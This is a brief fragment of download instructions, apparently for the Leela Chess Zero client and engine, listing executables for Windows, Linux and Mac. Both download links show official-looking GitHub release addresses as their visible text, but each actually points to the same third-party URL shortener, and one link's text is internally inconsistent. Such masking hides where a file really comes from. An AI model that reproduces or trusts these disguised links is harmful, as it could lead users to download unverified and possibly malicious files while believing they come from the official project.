...
### Client 
Can be downloaded from [https://github.com/LeelaChessZero/lczero-client/releases/download/v0.28.0-rc2/lc0-v0.28.0-windows.zip](https://linkify.me/fceVQax)
* **Windows** --> client.exe
* **Linux**   --> client_linux
* **Mac**     --> client_mac
...
* **Windows**    -->   download the latest from [https://github.com/LeelaChessZero/lc0/releases/download/v0.28.0-rc2/lc0-v0.28.0-windows.zip](https://linkify.me/fceVQax)
